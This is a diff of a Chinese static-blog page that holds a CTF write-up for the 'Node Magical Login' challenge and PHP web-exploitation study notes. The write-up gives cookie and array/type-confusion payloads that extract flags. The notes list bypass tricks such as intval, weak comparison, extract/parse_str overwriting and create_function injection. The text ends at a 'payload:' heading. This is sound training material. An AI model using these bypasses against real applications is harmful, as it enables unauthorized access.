class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())	<span class="comment">//cookie相等可以输出flag1</span></span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>获取flag有两种方法：</p>
-<p>一种是输入正确的username和password，但是密码是随机生成的</p>
-<p>另一种是使<code>user</code>的cookie相等</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">CheckInternalController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;check.html&quot;</span>,&#123;<span class="attr">root</span>:<span class="string">&quot;static&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;	<span class="comment">//传入长度需为16</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()<span class="comment">//被转成小写，但是这个处理不了数组格式</span></span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)	<span class="comment">//输出flag2</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;		<span class="comment">//长度不足16会跳转至此</span></span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>此处需满足<code>checkcode</code>&#x3D;&#x3D;aGr5AtSp55dRacer且长度为16即可获取flag2</p>
-</li>
-</ul>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
-<li><p>在&#x2F;flag1传入<code>cookie=admin</code>获取flag1</p>
-</li>
-<li><p>**toLowerCase()**此函数会将字符串转成小写形式，但是不能处理数组格式，因此传参选择传入json数组格式且重复16遍</p>
-</li>
-<li><p>在&#x2F;getflag2中使用POST请求</p>
-</li>
-</ul>
-<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p><img src="/blog/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022/2.png" alt="2"></p>
-<p>可获取flag1</p>
-<p><img src="/blog/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022/3.png" alt="3"></p>
-<p>可获取flag2（记得把content-type改成json）</p>
-<h2 id="其他解"><a href="#其他解" class="headerlink" title="其他解"></a>其他解</h2><ul>
-<li><p>传数组时拆成16个字符</p>
-<blockquote>
-<p>常规数组解法</p>
-</blockquote>
-</li>
-<li><pre><code class="json">&#123;&quot;checkcode&quot;:&#123;&quot;length&quot;:16&#125;&#125;
--------------------------------
-checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1&amp;checkcode=1
-</code></pre>
-<blockquote>
-<p>使try语句报错</p>
-</blockquote>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://c1oudflowing.github.io/blog/2023/02/28/Web%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/blog/images/avatar.gif">
-      <meta itemprop="name" content="CloudFlowing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog,from C1oudFLowing">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/02/28/Web%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Web笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-02-28 16:06:40 / 修改时间：16:32:57" itemprop="dateCreated datePublished" datetime="2023-02-28T16:06:40+08:00">2023-02-28</time>
+                CTF线上赛
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-
-          
-
+            2023/3/1
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="Node-Magical-Login"><a href="#Node-Magical-Login" class="headerlink" title="Node Magical Login"></a>Node Magical Login</h1><h2 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h2><p><img src="/blog/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022/1.png" alt="1"></p>
+<p>一个nodejs登录界面</p>
+            
         </div>
-      </header>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/blog/tags/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" style="color: #00a596">
+                西湖论剑
+            </a>
+        </span>
+        
+    </div>
+    <a href="/blog/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022/" class="go-post">阅读全文</a>
+</div>
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h1><p><a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/doxcnfAleQyWvxtaviJQUyfedGd">HNCTF WEB</a></p>
+<div class="post">
+    <a href="/blog/2023/02/28/Web%E7%AC%94%E8%AE%B0/">
+        <h2 class="post-title">Web笔记</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/2/28
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h1><p><a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/doxcnfAleQyWvxtaviJQUyfedGd">HNCTF WEB</a></p>
 <p>[ISCTF](D:\文档\CTF\Write Up\ISCTF2022-main\ISCTF2022-WriteUp.md)</p>
 <p>[Skynico](D:&#x2F;文档&#x2F;CTF&#x2F;Write Up&#x2F;SkyNICO Writeup.pdf)</p>
 <p>菜狗杯</p>
 <p>RCTF</p>
 <p>Hgame</p>
 <p><a target="_blank" rel="noopener" href="https://k4d0n.github.io/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/">西湖论剑</a></p>
-<hr>
-<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/weibanggang/p/9454581.html">八种请求</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lamaper/p/16625305.html">session</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq28129019/article/details/115913596?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166974060716782425643392%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166974060716782425643392&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-115913596-null-null.142%5Ev67%5Epc_rank_34_queryrelevant25,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E6%B3%95&spm=1018.2226.3001.4187">正则表达式</a></p>
-<p><a href="D:\文档\CTF\协会资料\burpsuite实战指南.pdf">BurpSuite</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ityard/article/details/102807071">python</a></p>
-<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-tutorial.html">PHP</a></h3><h4 id="弱类型下数字相等绕过方式："><a href="#弱类型下数字相等绕过方式：" class="headerlink" title="弱类型下数字相等绕过方式："></a>弱类型下数字相等绕过方式：</h4><p>  传入字符串</p>
-<p>  使用科学计数法</p>
-<blockquote>
-<p> 使用例</p>
-</blockquote>
-  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$year</span>==<span class="number">2022</span> &amp;&amp; <span class="variable">$year</span>+<span class="number">1</span>!==<span class="number">2023</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>此时传入202.2e1即可绕过</p>
-</blockquote>
-<hr>
-<h4 id="phpinfo-函数"><a href="#phpinfo-函数" class="headerlink" title="phpinfo()函数"></a>phpinfo()函数</h4><blockquote>
-<p>会输出关于 PHP 配置的信息</p>
-<p>返回类型：phpinfo()函数返回一个布尔值</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span> ([ <span class="keyword">int</span> <span class="variable">$what</span> = INFO_ALL ] )</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h4 id="system-函数"><a href="#system-函数" class="headerlink" title="system()函数"></a>system()函数</h4><blockquote>
-<p>系统权限允许的情况执行系统命令，并输出结果</p>
-</blockquote>
-<hr>
-<h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><ul>
-<li>post传入的参数并不能实现变量交换</li>
-</ul>
-<blockquote>
-<p>用我们自定义的参数值替换程序原有的变量值</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$$ </span><br><span class="line"><span class="title function_ invoke__">extract</span>()函数</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>()函数</span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>()函数</span><br></pre></td></tr></table></figure>
-
-<h5 id=""><a href="#" class="headerlink" title="$$"></a>$$</h5><blockquote>
-<p>将之前定义的变量的值重新定义新的变量</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=b</span><br><span class="line"><span class="variable">$b</span>=c</span><br><span class="line"></span><br><span class="line"><span class="variable">$$a</span> = $(<span class="variable">$a</span>) = <span class="variable">$b</span> = c</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a>extract()函数</h5><blockquote>
-<p>将数组中的变量导入到当前的符号表</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="keyword">array</span>,extract_rules,prefix) </span><br><span class="line">    </span><br><span class="line"><span class="comment">//array 必需的，规定要使用的数组</span></span><br><span class="line"><span class="comment">//extract_rules 可有可无，如果为空，则默认为EXTR_OVERWRITE</span></span><br><span class="line"><span class="comment">//prefix可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h5><blockquote>
-<p>把传入的字符串放入变量数组中去</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span>,<span class="keyword">array</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">//string 	必需。规定要解析的字符串。</span></span><br><span class="line"><span class="comment">//array 	可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</span></span><br><span class="line"><span class="comment">//          如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</span></span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h4 id="非法传参"><a href="#非法传参" class="headerlink" title="非法传参"></a>非法传参</h4><blockquote>
-<p>当变量名中出现点和空格时，变量名中的点和空格被转换成下划线</p>
-</blockquote>
-<ul>
-<li><p>版本：php &lt; 8</p>
-</li>
-<li><p>如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p>
-</li>
-</ul>
-<hr>
-<h4 id="PHP短标签"><a href="#PHP短标签" class="headerlink" title="PHP短标签"></a>PHP短标签</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span>  <span class="comment">#前提是开启配置参数short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span>  等价于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span>  <span class="comment">#不需要开启参数设置</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;   <span class="comment">#开启配置参数asp_tags=on，并且只能在7.0以下版本使用</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="comment">#不需要修改参数开关，但是只能在7.0以下可用。</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>可绕过过滤&lt;?</li>
-</ul>
-<hr>
-<h4 id="substr函数"><a href="#substr函数" class="headerlink" title="substr函数"></a>substr函数</h4><blockquote>
-<p>返回字符串的一部分</p>
-</blockquote>
-<p>  如果 参数<code>start </code>是负数且 <code>length</code> 小于或等于 <code>start</code>，则 <code>length</code> 为 0。</p>
-  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>,start,length)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p><code>start</code>:</p>
-<p>正数 - 在字符串的指定位置开始</p>
-<p>负数 - 在从字符串结尾的指定位置开始</p>
-<p>0 - 在字符串中的第一个字符处开始</p>
-</li>
-<li><p><code>length</code>:</p>
-<p>正数 - 从<code>start</code>参数所在的位置向后返回字符个数</p>
-<p>负数 - 从字符串末端指定位置向前返回字符个数</p>
-</li>
-</ul>
-<hr>
-<h4 id="intval函数"><a href="#intval函数" class="headerlink" title="intval函数"></a>intval函数</h4><blockquote>
-<p>将给定变量转换成整型变量</p>
-</blockquote>
-  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span> ( <span class="keyword">var</span> , base )</span><br><span class="line"><span class="comment">////var指要转换成 integer 的数量值,base指转化所使用的进制 </span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p><code>var</code> 可以是任何标量类型，变量不能是array和object格式</p>
-</li>
-<li><p>除非<code>var</code>参数是字符串，否则 <strong>intval()</strong> 的 <code>base </code>参数不会有效果</p>
-</li>
-<li><p>如果 <code>base </code>是 0，通过检测 <code>var </code>的格式来决定使用的进制： </p>
-<ul>
-<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；</li>
-<li>否则，如果字符串以 “0” 开始，使用 8 进制(octal)；</li>
-<li>否则，将使用 10 进制 (decimal)。</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>利用方式</p>
-</blockquote>
-<ul>
-<li><p>过滤某个数字时，我们可以利用它的进制转换来绕过</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">0x1A</span>);                    <span class="comment">// 2</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-</li>
-<li><p>数组绕过</p>
-<blockquote>
-<p>返回值<br>成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。 </p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a!=b)&#123;</span><br><span class="line">    <span class="keyword">if</span>(a==b)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//输入a[]=1和b[]=2绕过(此时两个不同但是都返回1)</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>小数点绕过</p>
-<blockquote>
-<p>小数点后的数字会直接舍去</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>单引号字母绕过</p>
-<blockquote>
-<p>单引号传值的时候，它只识别字母前面的一部分</p>
-<p>进行get传参时,默认加单引号</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>仅在<strong>php5</strong>下可实现1e10&#x3D;1；<strong>php7</strong>下会转换成10的10次方</li>
-<li>计算时1e10会自动转换为10的10次方</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h4 id="mt-srand函数"><a href="#mt-srand函数" class="headerlink" title="mt_srand函数"></a>mt_srand函数</h4><blockquote>
-<p>播种 Mersenne Twister 随机数生成器</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_srand</span>(seed);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>seed</code>：可选，规定播种值，设置之后即为伪随机</li>
-</ul>
-<h5 id="伪随机数漏洞"><a href="#伪随机数漏洞" class="headerlink" title="伪随机数漏洞"></a>伪随机数漏洞</h5><p>存在可预测性：</p>
-<p>知道种子后，可以确定输出伪随机数的序列<br>知道随机数序列，可以确定你的种子</p>
-<hr>
-<h4 id="hexdec函数"><a href="#hexdec函数" class="headerlink" title="hexdec函数"></a>hexdec函数</h4><blockquote>
-<p>返回与 <em>hex_string</em> 参数所表示的十六进制数等值的的十进制数</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hexdec</span>(hex_string)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>hexdec()</code> 会将遇到的所有非十六进制字符替换成 0，这样，所有左边的零都被忽略，但右边的零会计入值中</li>
-</ul>
-<hr>
-<h4 id="parse-url函数"><a href="#parse-url函数" class="headerlink" title="parse_url函数"></a>parse_url函数</h4><blockquote>
-<p>解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_url</span>(参数<span class="number">1</span>,参数<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>参数1：必填 ，是一个完整的URL，如果不完整，函数会模糊补全。</p>
-<p>参数2：非必填，是一个大写参数变量，直接获取结果集的某一部分。</p>
-</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu#id&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//&lt;pre&gt;Array</span></span><br><span class="line"><span class="comment">//(</span></span><br><span class="line"><span class="comment">//    [scheme] =&gt; https</span></span><br><span class="line"><span class="comment">//    [host] =&gt; www.baidu.com</span></span><br><span class="line"><span class="comment">//    [path] =&gt; /s</span></span><br><span class="line"><span class="comment">//    [query] =&gt; ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu</span></span><br><span class="line"><span class="comment">//    [fragment] =&gt; id</span></span><br><span class="line"><span class="comment">//)</span></span><br><span class="line"><span class="comment">//&lt;/pre&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h4 id="SERVER-‘REQUEST-URI’"><a href="#SERVER-‘REQUEST-URI’" class="headerlink" title="$_SERVER[‘REQUEST_URI’]"></a>$_SERVER[‘REQUEST_URI’]</h4><blockquote>
-<p>访问此页面所需的 URI </p>
-</blockquote>
-<hr>
-<h4 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h4><blockquote>
-<p>该函数用来创建匿名函数,并为其返回唯一名称</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>,<span class="keyword">string</span> <span class="variable">$code</span>)</span><br><span class="line"><span class="comment">//string $args 声明的函数变量部分</span></span><br><span class="line"><span class="comment">//string $code 执行的方法代码部分</span></span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li><p>使用例</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;echo $name. &#x27;</span>.<span class="string">&#x27;的编号是&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;; &#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$name&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;编号&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>(<span class="string">&#x27;sd&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>payload：</p>
